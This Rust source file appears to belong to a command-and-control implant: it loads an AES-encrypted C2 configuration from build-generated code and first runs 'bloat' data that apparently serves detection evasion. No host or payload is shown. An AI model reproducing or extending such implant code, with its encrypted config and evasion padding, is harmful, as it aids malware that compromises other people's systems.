// ./src/agent/config.rs
use crate::common::C2Config;
use serde_json;

// This file is generated by build.rs and contains the 
// AES Key, Nonce, Ciphertext arrays and the decrypt function.
include!(concat!(env!("OUT_DIR"), "/obfuscated_config.rs"));
include!(concat!(env!("OUT_DIR"), "/bloat_data.rs"));

pub fn load() -> C2Config {
    // 1. Run Bloat
    use_bloat();

    // 2. Decrypt Config using generated get_config()
    let config_json = get_config();
    
    // 3. Parse
    let config: C2Config = serde_json::from_str(&config_json)
        .expect("[-] Config parse failed");
    
    config
}
